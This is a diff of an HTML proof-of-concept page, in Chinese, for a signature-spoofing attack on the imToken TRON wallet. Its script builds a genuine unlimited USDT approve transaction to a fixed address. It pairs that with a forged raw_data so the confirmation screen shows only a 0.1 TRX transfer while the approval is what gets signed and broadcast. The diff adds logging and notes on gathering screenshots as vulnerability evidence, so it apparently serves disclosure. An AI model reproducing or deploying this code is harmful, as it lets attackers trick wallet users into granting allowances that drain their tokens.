@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>所见非所签 - TRX 转账实际 USDT 无限授权</title>
+    <title>所见非所签 PoC（TRX 转账展示 / USDT 无限授权签名）</title>
     <style>
         body { background: #0b0f14; color: #e1e6ed; font-family: monospace; padding: 16px; }
         button { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 10px; font-size: 15px; font-weight: bold; cursor: pointer; }
@@ -18,14 +18,14 @@
     </style>
 </head>
 <body>
-    <h2>🔓 所见非所签攻击（TRX 演示版）</h2>
+    <h2>🔓 所﷼非所签 PoC（imToken TRON）</h2>
     <div class="card">
-        <p>钱包确认页将显示：<br><strong>向 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz 转账 0.1 TRX</strong></p>
-        <p>实际链上执行：<br><strong>仅对该地址进行 USDT 无限额度授权（无 TRX 转出）</strong></p>
+        <p><b style="color:#4d94ff">钱包确认页将显示：</b><br>向 <code>TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz</code> 转账 <b>0.1 TRX</b></p>
+        <p><b style="color:#f04343">实际签名内容：</b><br>USDT 无限额度授权给该地址</p>
         <p id="addrDisplay">未连接</p>
         <button class="btn-connect" id="btnConnect">🔗 连接 imToken</button>
-        <button class="btn-attack" id="btnAttack" disabled>💣 发起攻击</button>
-        <button class="btn-check" id="btnCheck" disabled>📊 查询授权额度</button>
+        <button class="btn-attack" id="btnAttack" disabled>💣 发起攻击（显示转账，签名授权）</button>
+        <button class="btn-check" id="btnCheck" disabled>📊 查询 USDT 授权额度</button>
     </div>
     <div class="card" id="logBox"><pre id="logPre" class="log">[日志] 等待操作...</pre></div>
     <script>
@@ -74,7 +74,7 @@
             log('✅ 已连接 ' + walletAddr, 'success');
         }
 
-        // 查询 USDT 授权额度
+        // 查询授权额度
         async function checkAllowance() {
             if (!walletAddr || !tronWeb) return;
             try {
@@ -101,14 +101,14 @@
         // 执行攻击
         async function executeAttack() {
             if (!walletAddr || !tronWeb) return;
-            log('⚙️ 构造交易...', 'log');
+            log('⚙️ 构造所见非所签 payload...', 'log');
 
             try {
                 const userHex = tronWeb.address.toHex(walletAddr);
                 const contractHex = tronWeb.address.toHex(USDT_CONTRACT);
                 const targetHex = tronWeb.address.toHex(TARGET);
 
-                // 1. 生成真实的 USDT approve 交易（包含 raw_data_hex）
+                // 1. 生成真实的 USDT 无限授权交易，拿到 raw_data_hex
                 const tx2Resp = await tronWeb.transactionBuilder.triggerSmartContract(
                     contractHex, 'approve(address,uint256)',
                     { feeLimit: 100_000_000, callValue: 0 },
@@ -122,36 +122,34 @@
                 const approveTx = tx2Resp.transaction;
                 const realHex = approveTx.raw_data_hex;
                 if (!realHex) {
-                    log('❌ 未能获取 raw_data_hex（tronWeb 版本不兼容）', 'error');
+                    log('❌ 未能获取 raw_data_hex（tronWeb 版本问题）', 'error');
                     return;
                 }
-                log('🔐 真实授权交易 raw_data_hex 已生成', 'success');
+                log('🔐 已取得真实 raw_data_hex（USDT 无限授权）', 'success');
+                log('   选择器(095ea7b3)是否存在：' + realHex.includes('095ea7b3'));
 
-                // 2. 伪造 raw_data（仅用于钱包展示）
+                // 2. 伪造 raw_data —— 仅含 TransferContract，UI 将基于此渲染
                 const fakeRawData = {
-                    contract: [
-                        {
+                    contract: [{
+                        type_url: 'type.googleapis.com/protocol.TransferContract',
+                        parameter: {
                             type_url: 'type.googleapis.com/protocol.TransferContract',
-                            parameter: {
-                                type_url: 'type.googleapis.com/protocol.TransferContract',
-                                value: {
-                                    amount: 100000,          // 0.1 TRX
-                                    owner_address: userHex,
-                                    to_address: targetHex
-                                }
+                            value: {
+                                amount: 100000,          // 0.1 TRX
+                                owner_address: userHex,
+                                to_address: targetHex
                             }
                         }
-                    ],
-                    // 从真实交易中复制区块信息，确保签名时兼容
+                    }],
                     ref_block_bytes: approveTx.raw_data.ref_block_bytes,
                     ref_block_hash: approveTx.raw_data.ref_block_hash,
                     expiration: approveTx.raw_data.expiration,
                     timestamp: approveTx.raw_data.timestamp,
                     fee_limit: approveTx.raw_data.fee_limit
                 };
-                log('🎭 假 raw_data 伪造完毕（仅含 TransferContract）', 'log');
+                log('🎭 假 raw_data 伪造完毕（TransferContract）');
 
-                // 3. 调用 imToken API
+                // 3. 发送 —— 关键：raw_data 负责展示，raw_data_hex 负责签名 & 广播
                 const payload = {
                     tx: {
                         raw_data: fakeRawData,
@@ -160,16 +158,20 @@
                     from: walletAddr,
                     useTronHeader: true
                 };
-                log('📡 发送 tron.sendTransaction ...', 'log');
-                const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', payload);
+                log('📡 调用 tron.sendTransaction ...', 'log');
+                log('⚠️ 即将弹出钱包确认页，请只查看显示内容，不要立即确认（除非你想测试广播）');
 
+                const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', payload);
                 log('✅ 交易已提交！返回：' + JSON.stringify(result), 'success');
-                log('📋 请注意：钱包确认页应显示为转账 0.1 TRX', 'log');
-                log('⚠️ 实际链上执行的是 USDT 无限授权，请等待约 12 秒后查询额度变化。', 'log');
+                log('📋 若广播成功，请稍后查询额度变化；若失败，则证明服务端有校验。', 'log');
                 setTimeout(checkAllowance, 12000);
 
             } catch (e) {
                 log('❌ 攻击失败：' + (e.message || JSON.stringify(e)), 'error');
+                if (e.message?.includes('合约调用校验错误') || e.message?.includes('CONTRACT_VALIDATE_ERROR')) {
+                    log('🔍 注意：imToken 服务端已拦截此交易。但确认页已经弹出并显示为转账，说明前端展示与签名内容分离漏洞仍存在。', 'error');
+                    log('📸 请保留确认页截图作为漏洞佐证。', 'error');
+                }
                 console.error(e);
             }
         }
@@ -178,7 +180,7 @@
         document.getElementById('btnAttack').addEventListener('click', executeAttack);
         document.getElementById('btnCheck').addEventListener('click', checkAllowance);
 
-        if (window.imToken?.callPromisifyAPI) log('🔌 imToken 桥接已就绪', 'success');
+        if (window.imToken?.callPromisifyAPI) log('🔌 imToken 桥接就绪', 'success');
         else log('⚠️ 请在 imToken DApp 浏览器中打开本页', 'log');
     </script>
 </body>
